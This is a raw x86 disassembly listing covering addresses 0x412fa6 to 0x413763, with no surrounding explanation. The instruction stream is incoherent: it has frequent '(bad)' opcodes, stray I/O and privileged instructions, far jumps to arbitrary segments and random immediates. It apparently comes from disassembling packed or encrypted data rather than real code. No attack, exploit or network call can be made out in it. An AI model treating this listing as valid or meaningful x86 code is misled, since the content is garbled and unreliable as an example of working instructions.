  412fa6:	mov    al,0x8
  412fa8:	cdq    
  412fa9:	inc    edi
  412faa:	push   edi
  412fab:	inc    esi
  412fac:	push   esi
  412fad:	leave  
  412fae:	(bad)  
  412faf:	fnstenv [eax-0x40664246]
  412fb5:	push   ss
  412fb6:	(bad)
  412fb9:	mov    bh,0x95
  412fbb:	push   ebp
  412fbc:	loopne 0x41300f
  412fbe:	cmp    DWORD PTR [eax+esi*2+0x78],edx
  412fc2:	das    
  412fc3:	lods   eax,DWORD PTR ds:[esi]
  412fc4:	mov    edx,0xd4cfa127
  412fc9:	jl     0x412fd5
  412fcb:	xchg   ebp,eax
  412fcc:	inc    eax
  412fcd:	test   DWORD PTR [ebx+0x48],ebp
  412fd0:	mov    bh,0x7d
  412fd2:	clc    
  412fd3:	add    ebp,DWORD PTR [ebx+0x5ad98c2b]
  412fd9:	stc    
  412fda:	fiadd  DWORD PTR [edx+0x7ef950fe]
  412fe0:	add    cl,BYTE PTR [ebp-0x3f]
  412fe3:	scas   al,BYTE PTR es:[edi]
  412fe4:	push   esi
  412fe5:	jecxz  0x413024
  412fe7:	sti    
  412fe8:	out    dx,al
  412fe9:	imul   ecx,DWORD PTR [esi-0x323152b5],0xffffffe6
  412ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ff1:	lds    eax,FWORD PTR ds:0x7a5812b6
  412ff7:	pop    ebx
  412ff8:	jb     0x413024
  412ffa:	sbb    BYTE PTR [edx+0x6c33c023],cl
  413000:	cmp    eax,0x4ba28fdf
  413005:	test   DWORD PTR [edi],0x13a74dfc
  41300b:	js     0x412fd7
  41300d:	adc    BYTE PTR [ebp+0x77ad5c0c],0x7b
  413014:	adc    esp,DWORD PTR [ebx-0x29]
  413017:	jp     0x412ff9
  413019:	test   BYTE PTR [ebx-0xb4ca3e1],bl
  41301f:	ja     0x412fa1
  413021:	or     BYTE PTR [edi+0x54],bh
  413024:	xchg   BYTE PTR [ebp+0x28d30a8e],bh
  41302a:	pop    ds
  41302b:	push   0x73
  41302d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41302e:	pop    es
  41302f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413030:	ds in  al,0xfd
  413033:	adc    dh,dl
  413035:	sahf   
  413036:	(bad)  
  413037:	dec    esp
  413038:	cmp    edx,eax
  41303a:	fsubr  DWORD PTR [edi-0x4e]
  41303d:	sbb    DWORD PTR [ebp-0x15],esi
  413040:	mov    esi,0xbac628dd
  413045:	pop    es
  413046:	or     ebx,DWORD PTR [ebx]
  413048:	fwait
  413049:	jmp    0x413066
  41304b:	cld    
  41304c:	pop    eax
  41304d:	adc    eax,0x661a8292
  413052:	gs inc ecx
  413054:	jns    0x413024
  413056:	fs scas eax,DWORD PTR es:[edi]
  413058:	pop    ss
  413059:	lahf   
  41305a:	(bad)
  41305d:	add    BYTE PTR [edi-0x1371adfa],dh
  413063:	test   DWORD PTR [edx+0x7c],ebp
  413066:	loope  0x41305c
  413068:	stos   DWORD PTR es:[edi],eax
  413069:	add    BYTE PTR [eax-0x7d],0xae
  41306d:	je     0x41301b
  41306f:	mov    ds:0x2adb052f,al
  413074:	fwait
  413075:	push   ds
  413076:	or     bh,BYTE PTR [ecx-0x3e89bc40]
  41307c:	adc    BYTE PTR ds:0x5a04b2e5,0xd7
  413083:	push   0x63bb20e0
  413088:	addr16 (bad) 
  41308a:	lahf   
  41308b:	int3   
  41308c:	jmp    0x8ae4:0x45193d0d
  413093:	sub    bh,BYTE PTR [esi-0x408426a3]
  413099:	mov    bl,0x2d
  41309b:	dec    esi
  41309c:	and    DWORD PTR [esi],ebx
  41309e:	je     0x41303b
  4130a0:	jns    0x413103
  4130a2:	xchg   ebp,eax
  4130a3:	sbb    BYTE PTR [eax],dl
  4130a5:	test   ebx,ebp
  4130a7:	retf   0xd561
  4130aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130ab:	mov    ds:0x96e3bab1,al
  4130b0:	jo     0x413129
  4130b2:	sbb    dh,bh
  4130b4:	adc    dh,dh
  4130b6:	sahf   
  4130b7:	arpl   ax,sp
  4130b9:	adc    al,0xce
  4130bb:	pop    es
  4130bc:	pop    es
  4130bd:	inc    edi
  4130be:	cmp    esi,DWORD PTR [edi]
  4130c0:	into   
  4130c1:	pop    ss
  4130c2:	popa   
  4130c3:	fidivr DWORD PTR [edi]
  4130c5:	mov    cl,ah
  4130c7:	sbb    eax,0xca5b2994
  4130cc:	jno    0x413095
  4130ce:	gs and eax,0xaa67ea59
  4130d4:	stc    
  4130d5:	dec    esi
  4130d6:	mov    eax,ds:0xd7a6cecb
  4130db:	cli    
  4130dc:	fdivr  st(7),st
  4130de:	mov    dl,0x9b
  4130e0:	out    dx,eax
  4130e1:	jp     0x41306f
  4130e3:	test   dl,dh
  4130e5:	aam    0xa9
  4130e7:	out    dx,al
  4130e8:	out    0x43,al
  4130ea:	sbb    esp,esp
  4130ec:	mov    al,0x8b
  4130ef:	jge    0x41309c
  4130f1:	mov    ebp,0x910e0a0b
  4130f6:	cmp    bh,dh
  4130f8:	div    BYTE PTR [ebp-0x5fee23cd]
  4130fe:	dec    ebx
  4130ff:	cmp    BYTE PTR [eax+0x19],cl
  413102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413103:	xchg   esp,eax
  413104:	jle    0x41314f
  413106:	xchg   esi,eax
  413107:	push   0x39
  413109:	xor    cl,BYTE PTR [ecx-0x7c]
  41310c:	je     0x4130f7
  41310e:	aam    0x2e
  413110:	mov    ch,0xca
  413112:	push   ss
  413113:	add    ebx,edx
  413115:	cmp    DWORD PTR [esi-0x237911be],0xffffff89
  41311c:	dec    esp
  41311d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41311e:	mov    ah,0x4f
  413120:	shl    BYTE PTR [edx-0x28cf3d6b],1
  413126:	or     al,0x65
  413128:	dec    esp
  413129:	jge    0x413169
  41312b:	mov    al,ah
  41312d:	adc    eax,0x22c016d4
  413132:	sti    
  413133:	pop    ebx
  413134:	cmp    al,0x6a
  413136:	jge    0x413171
  413138:	cmp    al,0x29
  41313a:	add    cl,ch
  41313c:	adc    dl,BYTE PTR [edi-0x4c]
  41313f:	mov    eax,0xa661b950
  413144:	rcr    bl,0x7f
  413147:	test   BYTE PTR [edi-0x2f],0xa6
  41314b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41314c:	js     0x413162
  41314e:	out    0x7d,eax
  413150:	test   al,0x11
  413152:	dec    ebx
  413153:	push   ecx
  413154:	paddw  mm1,mm1
  413157:	add    dh,BYTE PTR [edx-0x14415b18]
  41315d:	xor    al,0xb8
  41315f:	out    dx,eax
  413160:	push   ss
  413161:	ja     0x413107
  413163:	xchg   edi,eax
  413164:	loope  0x4131a1
  413166:	stc    
  413167:	inc    ebp
  413168:	mov    WORD PTR [eax-0x6f837610],ds
  41316e:	inc    edx
  41316f:	push   ds
  413170:	rcr    BYTE PTR [esi],1
  413172:	mov    eax,DWORD PTR [edi-0x66e40b02]
  413178:	adc    BYTE PTR [esi+0x8c6281d],cl
  41317e:	add    ch,BYTE PTR [ebx]
  413180:	cmp    DWORD PTR [bp-0x20fc],edx
  413185:	mov    esi,0x732b01c8
  41318a:	enter  0xe249,0x9a
  41318e:	mov    ecx,0x4a606ec9
  413193:	test   al,0x48
  413195:	ja     0x4131ff
  413197:	sbb    DWORD PTR [ebx-0x71],edx
  41319a:	jge    0x4131e5
  41319c:	xor    DWORD PTR [eax-0x1158658b],0x678fdf44
  4131a6:	pop    ecx
  4131a7:	into   
  4131a8:	pusha  
  4131a9:	mov    ebp,0x111a6eca
  4131ae:	mov    ch,BYTE PTR [ebx]
  4131b0:	inc    eax
  4131b1:	push   ecx
  4131b2:	xchg   BYTE PTR ds:0x5a8f2ded,cl
  4131b8:	shl    BYTE PTR [edi],cl
  4131ba:	aaa    
  4131bb:	in     al,dx
  4131bc:	mov    esi,0x5abbdc0b
  4131c1:	repz dec ebp
  4131c3:	xchg   ebp,eax
  4131c4:	cmp    dh,ch
  4131c6:	enter  0x3994,0xe0
  4131ca:	stos   DWORD PTR es:[edi],eax
  4131cb:	test   al,0xc4
  4131cd:	jae    0x4131d4
  4131cf:	adc    ah,BYTE PTR [esi-0x49]
  4131d2:	mov    eax,ds:0x77fa021f
  4131d7:	adc    dh,ah
  4131d9:	mov    dh,0xc4
  4131db:	loopne 0x413195
  4131dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131de:	pop    ebp
  4131df:	scas   al,BYTE PTR es:[edi]
  4131e0:	jmp    0xae8261c1
  4131e5:	fist   WORD PTR [ebx-0x182b41c]
  4131eb:	mov    dh,0xba
  4131ed:	test   ebx,0x6d9735ca
  4131f3:	adc    al,BYTE PTR [ecx+0x1c61fe0f]
  4131f9:	mov    ecx,0xfadae801
  4131fe:	and    ecx,0x0
  413201:	mov    ecx,0xecf70817
  413206:	cs outs dx,BYTE PTR gs:[esi]
  413209:	loop   0x413240
  41320b:	push   edi
  41320c:	dec    esp
  41320d:	je     0x413264
  41320f:	and    al,0x5
  413211:	dec    esp
  413212:	jge    0x4131f0
  413214:	mov    al,ds:0xb8f6d36e
  413219:	push   ecx
  41321a:	daa    
  41321b:	adc    bl,BYTE PTR [ebp+0x352aed35]
  413221:	mov    ebp,0x411ff182
  413226:	fisubr DWORD PTR [ebp+ebx*8+0x54635b4e]
  41322d:	mov    cl,0xea
  41322f:	jb     0x413220
  413231:	pop    esi
  413232:	jbe    0x413249
  413234:	in     al,dx
  413235:	nop
  413236:	aad    0xd5
  413238:	xor    eax,0xce28803f
  41323d:	imul   ecx,DWORD PTR [esi+ebx*1-0x4e6961c6],0x16
  413245:	lea    ecx,[edi]
  413247:	std    
  413248:	xchg   ebp,eax
  413249:	les    ebx,FWORD PTR [ebx]
  41324b:	cs gs inc ecx
  41324e:	jne    0x4132be
  413250:	mov    edx,DWORD PTR [esi+esi*2+0x5a59319d]
  413257:	or     eax,0xbb59b076
  41325c:	add    esi,DWORD PTR [eax]
  41325e:	(bad)  
  413260:	jo     0x413202
  413262:	and    BYTE PTR [edi-0x57],0xa0
  413266:	mov    ah,0xd2
  413268:	fld    TBYTE PTR [esi+eiz*1]
  41326b:	into   
  41326c:	add    cl,BYTE PTR [edx+0xf]
  41326f:	jno    0x413274
  413271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413272:	mov    dl,0x7a
  413274:	add    cl,bh
  413276:	add    eax,0xc247b739
  41327b:	and    al,0x86
  41327d:	xchg   ecx,eax
  41327e:	leave  
  41327f:	loope  0x413214
  413281:	sub    BYTE PTR [edi-0x2b],0x0
  413285:	adc    eax,0xa98cdb80
  41328a:	iret   
  41328b:	push   edx
  41328c:	xchg   al,dl
  41328e:	xchg   BYTE PTR [ebp+esi*8-0x27],dl
  413292:	das    
  413293:	call   0x7a9f:0x9277eecf
  41329a:	dec    edi
  41329b:	iret   
  41329c:	xchg   ecx,ecx
  41329e:	mov    edi,0x482f6116
  4132a3:	dec    edx
  4132a4:	or     ch,BYTE PTR [ebx]
  4132a6:	inc    ebp
  4132a7:	fsub   DWORD PTR [eax]
  4132a9:	and    ebp,ebx
  4132ab:	arpl   WORD PTR [ecx-0x68],sp
  4132ae:	test   DWORD PTR [esi-0x4d],ebx
  4132b1:	cmp    esi,esi
  4132b3:	lock scas al,BYTE PTR es:[edi]
  4132b5:	inc    eax
  4132b6:	push   es
  4132b7:	push   edi
  4132b8:	mov    ah,0xf
  4132ba:	sub    al,0xc7
  4132bc:	loopne 0x413297
  4132be:	jno    0x413315
  4132c0:	fidiv  WORD PTR [edx+ebx*1-0x5a9d5818]
  4132c7:	adc    al,BYTE PTR [ecx-0x56]
  4132ca:	cmp    eax,0xa71dc19f
  4132cf:	and    eax,edx
  4132d1:	int3   
  4132d2:	aam    0xc8
  4132d4:	sub    BYTE PTR [ebp+0x11],0x81
  4132d8:	shr    BYTE PTR [edx],cl
  4132da:	sub    DWORD PTR [eax-0x6e339347],esp
  4132e0:	inc    ecx
  4132e1:	pop    gs
  4132e3:	dec    ebp
  4132e4:	pop    ebx
  4132e5:	js     0x41330f
  4132e7:	in     al,dx
  4132e8:	stos   DWORD PTR es:[edi],eax
  4132e9:	sbb    DWORD PTR [edi+ecx*1],0x8aa2d563
  4132f0:	cmp    ebx,DWORD PTR [eax]
  4132f2:	mov    dl,0xaa
  4132f4:	xor    DWORD PTR [bx+di-0x13d3],edi
  4132f9:	push   eax
  4132fa:	adc    eax,0x28ac4576
  4132ff:	lods   eax,DWORD PTR ds:[esi]
  413300:	pop    edx
  413301:	ficomp WORD PTR [esi-0x63]
  413304:	enter  0xd0d6,0x9b
  413308:	retf   
  413309:	xchg   esi,eax
  41330a:	sub    eax,0x3eabbfe7
  41330f:	stos   DWORD PTR es:[edi],eax
  413310:	stc    
  413311:	mov    dh,0x9a
  413313:	push   edi
  413314:	dec    edx
  413315:	mov    al,ds:0x10d0c92d
  41331a:	dec    BYTE PTR [ebx+0x3c]
  41331d:	pop    ss
  41331e:	and    eax,0x243c0d72
  413323:	mov    eax,fs
  413325:	mov    ah,0x9c
  413327:	pop    eax
  413328:	xchg   esp,eax
  413329:	xor    ebp,DWORD PTR [ecx]
  41332b:	(bad)  
  41332c:	rcr    BYTE PTR [ecx-0x465c88a9],1
  413332:	dec    ecx
  413333:	imul   ebp,DWORD PTR [eax+0x33],0xffffffd0
  413337:	push   ebx
  413338:	stc    
  413339:	pop    eax
  41333a:	sub    DWORD PTR [ebp+0x39dc00c9],eax
  413340:	pushf  
  413341:	fist   WORD PTR [ebp+ebp*1+0x71]
  413345:	mov    esp,DWORD PTR [ebp-0x52]
  413348:	lods   al,BYTE PTR ds:[esi]
  413349:	out    0x7b,eax
  41334b:	hlt    
  41334c:	sbb    DWORD PTR [ebx-0x30ccb835],ebp
  413352:	pusha  
  413353:	nop
  413354:	fcmovbe st,st(2)
  413356:	mov    al,0x90
  413358:	add    dh,BYTE PTR ds:0x73fddcd0
  41335e:	push   eax
  41335f:	lock jne 0x4132ed
  413362:	sub    DWORD PTR [esi+0x478a560e],esp
  413368:	inc    ecx
  413369:	jle    0x4132f9
  41336b:	ret    0x2c65
  41336e:	jb     0x413307
  413370:	inc    esi
  413371:	sbb    eax,0x7f1fc306
  413376:	std    
  413377:	push   0x826a8573
  41337c:	popa   
  41337d:	jmp    0x41335c
  41337f:	jmp    0x65561ae4
  413384:	push   cs
  413385:	popa   
  413386:	lea    esi,ss:[esi-0x5945a3e1]
  41338d:	psubusb mm1,QWORD PTR [edi]
  413390:	scas   al,BYTE PTR es:[edi]
  413391:	psrlw  mm0,QWORD PTR [edx-0x7f131eb5]
  413398:	lds    edx,FWORD PTR [esi]
  41339a:	xchg   edx,eax
  41339b:	cmp    bh,BYTE PTR [esi+0x7b]
  41339e:	mov    esp,0xc18f49dc
  4133a3:	pop    ss
  4133a4:	aaa    
  4133a5:	(bad)  
  4133a7:	mov    al,0xbf
  4133a9:	xor    eax,0xa9985159
  4133ae:	hlt    
  4133af:	es jecxz 0x41333f
  4133b2:	and    edi,DWORD PTR [edx+ecx*2+0x63cec758]
  4133b9:	jo     0x41336b
  4133bb:	push   0xfffffff8
  4133bd:	aas    
  4133be:	push   edi
  4133bf:	data16 jmp 0x41335b
  4133c2:	and    BYTE PTR [di-0x5e83],cl
  4133c7:	push   edx
  4133c8:	and    al,0xb6
  4133ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133cb:	stc    
  4133cc:	(bad)  
  4133cd:	fisttp WORD PTR [ecx]
  4133cf:	and    eax,0xcce6285c
  4133d4:	(bad)  
  4133d5:	jae    0x41342d
  4133d7:	inc    edi
  4133d8:	sbb    BYTE PTR [ebx],ch
  4133da:	sub    bh,BYTE PTR [ebp-0x580777e8]
  4133e0:	test   al,0x95
  4133e2:	loopne 0x413427
  4133e4:	inc    dl
  4133e6:	jl     0x41344b
  4133e8:	dec    ebp
  4133e9:	pop    ecx
  4133ea:	or     BYTE PTR [edi+0xe],al
  4133ed:	jb     0x4133e0
  4133ef:	rcr    DWORD PTR [eax+edi*8-0x24],0x3
  4133f4:	dec    esp
  4133f5:	dec    ebx
  4133f6:	jne    0x4133da
  4133f8:	lahf   
  4133f9:	lea    ebx,[ecx+eiz*2+0x790e0f31]
  413400:	pusha  
  413401:	ret    
  413402:	pop    bx
  413404:	push   edx
  413405:	aad    0x1b
  413407:	add    DWORD PTR [ecx+0x64],eax
  41340a:	imul   esp,ecx,0x4
  41340d:	int    0xab
  41340f:	mov    ah,BYTE PTR [ebp-0x16]
  413412:	popa   
  413413:	mov    cl,0xc4
  413415:	retf   
  413416:	jmp    0xc9bc:0x72eabbb
  41341d:	(bad)
  413420:	push   cs
  413421:	add    ch,BYTE PTR [eax+0x1538f3]
  413427:	inc    eax
  413428:	fld    QWORD PTR [esi]
  41342a:	ret    
  41342b:	add    BYTE PTR [edi-0x4b],bl
  41342e:	fld    TBYTE PTR [ebp+0x3e]
  413431:	pop    ebx
  413432:	aas    
  413433:	add    edx,DWORD PTR gs:[eax+edi*4+0x13]
  413438:	(bad)  
  41343a:	mov    eax,ds:0x8daf8d48
  41343f:	dec    ebx
  413440:	jnp    0x41346d
  413442:	shr    BYTE PTR [esi+0x3c642566],cl
  413448:	ins    DWORD PTR es:[edi],dx
  413449:	push   edi
  41344a:	loope  0x4134bd
  41344c:	(bad)  
  41344d:	push   ss
  41344e:	lahf   
  41344f:	sbb    al,al
  413451:	jle    0x41349d
  413453:	jae    0x41345d
  413455:	fnstcw WORD PTR [ecx-0x13]
  413458:	sti    
  413459:	jno    0x41340a
  41345b:	je     0x4134d6
  41345d:	xchg   edi,eax
  41345e:	dec    ebp
  41345f:	fiadd  WORD PTR [eax+ebx*4]
  413462:	sahf   
  413463:	add    eax,0x8137f034
  413468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413469:	push   es
  41346a:	xor    esp,DWORD PTR [edx]
  41346c:	push   ds
  41346d:	add    eax,0x7a38c07e
  413472:	lods   al,BYTE PTR ds:[esi]
  413473:	ss ds nop
  413476:	mov    ch,0xc8
  413478:	pusha  
  413479:	cli    
  41347a:	ja     0x41345a
  41347c:	xchg   cl,dh
  41347e:	jg     0x4134fb
  413480:	(bad)  
  413481:	mov    cl,0xcf
  413483:	sbb    BYTE PTR [esi],cl
  413485:	ins    DWORD PTR es:[edi],dx
  413486:	adc    ebp,edi
  413488:	bound  edi,QWORD PTR ds:0x55d719bb
  41348e:	ins    DWORD PTR es:[edi],dx
  41348f:	or     BYTE PTR [esi],ch
  413491:	push   edx
  413492:	fcmovnb st,st(3)
  413494:	arpl   sp,si
  413496:	js     0x41343a
  413498:	xchg   edi,eax
  413499:	das    
  41349a:	popf   
  41349b:	push   esp
  41349c:	aas    
  41349d:	cmc    
  41349e:	adc    edi,DWORD PTR [ecx-0x532b3581]
  4134a4:	sbb    al,BYTE PTR [edx+0x4d]
  4134a7:	add    ebx,edi
  4134a9:	mov    eax,ds:0x2abcd2d9
  4134ae:	xor    eax,0x67b7f528
  4134b3:	mov    al,ds:0x12997c38
  4134b8:	jge    0x4134d9
  4134ba:	pop    es
  4134bb:	ds in  eax,dx
  4134bd:	and    edx,DWORD PTR [eax+0x634d482c]
  4134c3:	cdq    
  4134c4:	test   ecx,edi
  4134c6:	arpl   bp,sp
  4134c8:	adc    DWORD PTR ds:0x5208f072,esp
  4134ce:	lahf   
  4134cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134d0:	test   BYTE PTR [ebx+0x4a],dl
  4134d3:	out    0xd9,eax
  4134d5:	call   0x99f2088b
  4134da:	jne    0x413479
  4134dc:	and    al,dh
  4134de:	stos   DWORD PTR es:[edi],eax
  4134df:	push   ecx
  4134e0:	mov    al,cs:0x6e0e4f0f
  4134e6:	sbb    ebx,ebp
  4134e8:	adc    BYTE PTR [ebp+eax*4-0x24],al
  4134ec:	xchg   edi,eax
  4134ed:	mov    ah,al
  4134ef:	adc    esi,DWORD PTR [edx]
  4134f1:	(bad)  
  4134f2:	call   FWORD PTR [ebp-0x7434b04b]
  4134f8:	(bad)  
  4134fa:	mov    WORD PTR ds:0xff08c1ee,cs
  413500:	inc    esp
  413501:	idiv   BYTE PTR [edx]
  413503:	sub    ch,dh
  413505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413506:	adc    BYTE PTR [ecx+0x6666f5e3],bh
  41350c:	mov    WORD PTR [edx],es
  41350e:	xor    esi,ebx
  413510:	loopne 0x413565
  413512:	inc    ebx
  413513:	mov    al,0x9b
  413515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413516:	inc    eax
  413517:	xchg   ecx,eax
  413518:	lods   al,BYTE PTR ds:[esi]
  413519:	dec    esi
  41351a:	adc    BYTE PTR [edx-0x76554538],0x90
  413521:	retf   
  413522:	ins    BYTE PTR es:[edi],dx
  413523:	inc    edi
  413524:	ins    BYTE PTR es:[edi],dx
  413525:	sti    
  413526:	lahf   
  413527:	and    esi,DWORD PTR [esi-0x521047e9]
  41352d:	loope  0x413555
  41352f:	push   eax
  413530:	fsubr  QWORD PTR [edx]
  413532:	sbb    DWORD PTR [edi+0x17],edi
  413535:	cmp    dh,BYTE PTR [edi-0x231b38b6]
  41353b:	out    dx,al
  41353c:	mov    ds:0xa6bc71e9,al
  413541:	cmp    bh,BYTE PTR [ecx-0x5aee821b]
  413547:	xchg   edi,eax
  413548:	les    edi,FWORD PTR [ecx]
  41354a:	mov    al,ds:0x844dbdda
  41354f:	shl    esi,0xc0
  413552:	cmp    DWORD PTR [esi+0x5112f341],0x6ec973f
  41355c:	fcom   DWORD PTR [edi+0x22]
  41355f:	xchg   esi,eax
  413560:	xor    BYTE PTR [ecx],bh
  413562:	cwde   
  413563:	dec    edi
  413564:	mov    bl,0xe4
  413566:	shr    DWORD PTR [edi-0x789f7701],1
  41356c:	rcr    DWORD PTR [ebx],cl
  41356e:	xor    DWORD PTR [edx-0x7d],esi
  413571:	jecxz  0x4134fd
  413573:	sub    BYTE PTR [ebx+0x31773221],ch
  413579:	mov    ecx,DWORD PTR [eax-0x52]
  41357c:	dec    ebp
  41357d:	pop    ss
  41357e:	pop    ss
  41357f:	repnz mov dh,BYTE PTR [edi+0x43]
  413583:	and    edi,ecx
  413585:	pusha  
  413586:	inc    ebp
  413587:	pop    DWORD PTR [edx+edi*1]
  41358a:	lar    esp,WORD PTR [edx-0x48]
  41358e:	mov    al,0xaf
  413590:	aaa    
  413591:	mov    ebx,0xe36e3daa
  413596:	add    edx,DWORD PTR [eax-0x9]
  413599:	(bad)  
  41359a:	mov    dl,0x70
  41359c:	add    al,0x7d
  41359e:	pop    ss
  41359f:	paddq  mm7,QWORD PTR [ecx+eax*4]
  4135a3:	sub    ch,ah
  4135a5:	push   ss
  4135a6:	push   0xaf927e22
  4135ab:	out    dx,eax
  4135ac:	cld    
  4135ad:	dec    eax
  4135ae:	sbb    DWORD PTR [eax+0x2d1a577a],edi
  4135b4:	add    BYTE PTR [edx-0x4f],bh
  4135b7:	sbb    BYTE PTR [esi+eax*8-0x278ab5f7],al
  4135be:	push   ebp
  4135bf:	in     eax,0xc3
  4135c1:	push   ebp
  4135c2:	scas   al,BYTE PTR es:[edi]
  4135c3:	xor    edx,DWORD PTR [eax]
  4135c5:	sbb    BYTE PTR [esi+0x46b26118],al
  4135cb:	cmp    DWORD PTR [edx+esi*8],ebx
  4135ce:	adc    eax,0x1833a081
  4135d3:	push   edi
  4135d4:	xor    eax,0x9e2d181a
  4135d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135da:	nop
  4135db:	sub    ah,ah
  4135dd:	in     eax,dx
  4135de:	mov    dh,0x92
  4135e0:	jl     0x41358a
  4135e2:	leave  
  4135e3:	aaa    
  4135e4:	fimul  WORD PTR [ebx]
  4135e6:	or     DWORD PTR [eax-0x2f],ebx
  4135e9:	inc    edi
  4135ea:	cmp    DWORD PTR [edx+ecx*4-0x62],ebx
  4135ee:	rol    dh,1
  4135f0:	mov    bh,0x17
  4135f2:	test   DWORD PTR [edx+0x68],ecx
  4135f5:	ret    
  4135f6:	pop    ebp
  4135f7:	cmp    dl,cl
  4135f9:	leave  
  4135fa:	sbb    dl,BYTE PTR [ebx-0x5506563f]
  413600:	push   ds
  413601:	(bad)
  413606:	f2xm1  
  413608:	xchg   ecx,eax
  413609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41360a:	push   0xc7dfad07
  41360f:	jns    0x4135b6
  413611:	test   al,0x70
  413613:	and    edx,DWORD PTR [esi-0x30]
  413616:	mov    ch,0x1b
  413618:	shl    ch,0x61
  41361b:	dec    esp
  41361c:	mov    ah,0x31
  41361e:	lods   eax,DWORD PTR ds:[esi]
  41361f:	test   al,0x52
  413621:	xor    eax,0xce5c0b04
  413626:	ror    al,0x84
  413629:	scas   al,BYTE PTR es:[edi]
  41362a:	jl     0x41363d
  41362c:	mov    al,ds:0xf475d0c1
  413631:	shr    BYTE PTR [ebp+0x253f37ed],1
  413637:	inc    ebx
  413638:	pcmpgtw mm2,QWORD PTR [ecx+0x73]
  41363c:	test   DWORD PTR [ecx],0xdda45c62
  413642:	stos   DWORD PTR es:[edi],eax
  413643:	add    BYTE PTR [ecx-0x72],bh
  413646:	adc    BYTE PTR [eax-0x26],al
  413649:	inc    ebp
  41364a:	inc    DWORD PTR [edi]
  41364c:	pop    edx
  41364d:	xchg   ebx,eax
  41364e:	fcom   QWORD PTR [ebp+0x37c6f204]
  413654:	add    BYTE PTR [ebp-0x5fd5548c],bl
  41365a:	stos   BYTE PTR es:[edi],al
  41365b:	sbb    al,0xd7
  41365d:	and    DWORD PTR [esi],ecx
  41365f:	cli    
  413660:	les    edx,FWORD PTR [ecx+0x2d]
  413663:	sbb    edi,DWORD PTR [eax]
  413665:	pop    ss
  413666:	and    esi,DWORD PTR [ebp+0x8201b5a]
  41366c:	dec    edi
  41366d:	test   esi,esp
  41366f:	(bad)  
  413670:	daa    
  413671:	dec    ebx
  413672:	and    al,0x87
  413674:	dec    esi
  413675:	adc    DWORD PTR [eax-0x15],ebx
  413678:	ds data16 mov dh,0xac
  41367c:	jecxz  0x4136f5
  41367e:	dec    edi
  41367f:	sub    ebx,DWORD PTR [ecx-0x25]
  413682:	push   0x1f8560b9
  413687:	icebp  
  413688:	enter  0xf103,0x3e
  41368c:	mov    esi,0xdc515d97
  413691:	int3   
  413692:	inc    ecx
  413693:	xor    ch,ah
  413695:	jno    0x41368e
  413697:	cld    
  413698:	dec    edx
  413699:	jb     0x41363f
  41369b:	jmp    0x413660
  41369d:	ret    
  41369e:	or     al,0xa6
  4136a0:	or     eax,0x1f7a373f
  4136a5:	clc    
  4136a6:	push   es
  4136a7:	jle    0x4136fd
  4136a9:	ins    DWORD PTR es:[edi],dx
  4136aa:	xchg   BYTE PTR [ecx],dl
  4136ac:	pop    ss
  4136ad:	xchg   esp,eax
  4136ae:	jmp    0xc9833df1
  4136b3:	jno    0x41367b
  4136b5:	mov    eax,ds:0xc44fc81a
  4136ba:	inc    esp
  4136bb:	cwde   
  4136bc:	xor    DWORD PTR [esi+0x39dd3075],0x4917b590
  4136c6:	icebp  
  4136c7:	fwait
  4136c8:	and    DWORD PTR [ebp-0x794b5343],ecx
  4136ce:	hlt    
  4136cf:	adc    bh,BYTE PTR [esp-0x48]
  4136d3:	mov    al,ds:0x7a4385ac
  4136d8:	int3   
  4136d9:	sub    al,0xcf
  4136db:	adc    al,0x80
  4136dd:	xchg   esp,eax
  4136de:	out    dx,eax
  4136df:	and    BYTE PTR [edi+0x65],0x93
  4136e3:	jl     0x4136f7
  4136e5:	dec    bp
  4136e7:	mov    BYTE PTR [esi+0x87d8e53],bl
  4136ed:	faddp  st(0),st
  4136ef:	and    ch,BYTE PTR [ebp+0x10]
  4136f2:	aad    0xbe
  4136f4:	in     eax,dx
  4136f5:	jo     0x4136bf
  4136f7:	push   ebx
  4136f8:	sub    BYTE PTR [ebp-0x34beaefe],dl
  4136fe:	aas    
  4136ff:	lds    ebp,FWORD PTR ds:0xb5851cb0
  413705:	out    0x1,al
  413707:	mov    bh,0x50
  413709:	push   eax
  41370a:	cs mov bh,0x77
  41370d:	gs lock pop edi
  413710:	push   edx
  413711:	push   ss
  413712:	js     0x413731
  413714:	mov    ?,esp
  413716:	mov    eax,ds:0x863165fb
  41371b:	dec    edx
  41371c:	or     esi,DWORD PTR [edx+0x22546b67]
  413722:	les    ecx,FWORD PTR [esi+0x1f]
  413725:	adc    DWORD PTR [edi-0x12],edx
  413728:	leave  
  413729:	xchg   ebp,eax
  41372a:	push   0xffffffd7
  41372c:	xchg   ecx,eax
  41372d:	pop    esp
  41372e:	scas   al,BYTE PTR es:[edi]
  41372f:	push   edi
  413730:	dec    ebp
  413731:	inc    ebx
  413732:	mov    ebp,DWORD PTR [esi+0x47]
  413735:	and    eax,esi
  413737:	sbb    ecx,ebx
  413739:	pop    ecx
  41373a:	or     eax,DWORD PTR [ecx+0x341e4573]
  413740:	test   BYTE PTR [eax],dl
  413742:	jmp    0x41377a
  413744:	ds fmul st(0),st
  413747:	mov    ebp,0x4ce0e3bb
  41374c:	add    ah,BYTE PTR [esi]
  41374e:	cmp    BYTE PTR [ebx+0x3b],bl
  413751:	push   es
  413752:	cld    
  413753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413754:	mov    dh,0xcc
  413756:	(bad)  
  413758:	adc    edi,eax
  41375a:	ret    
  41375b:	mov    eax,0x3a2d5d0c
  413760:	inc    ebx
  413761:	jne    0x413749
  413763:	addr16 push ebx
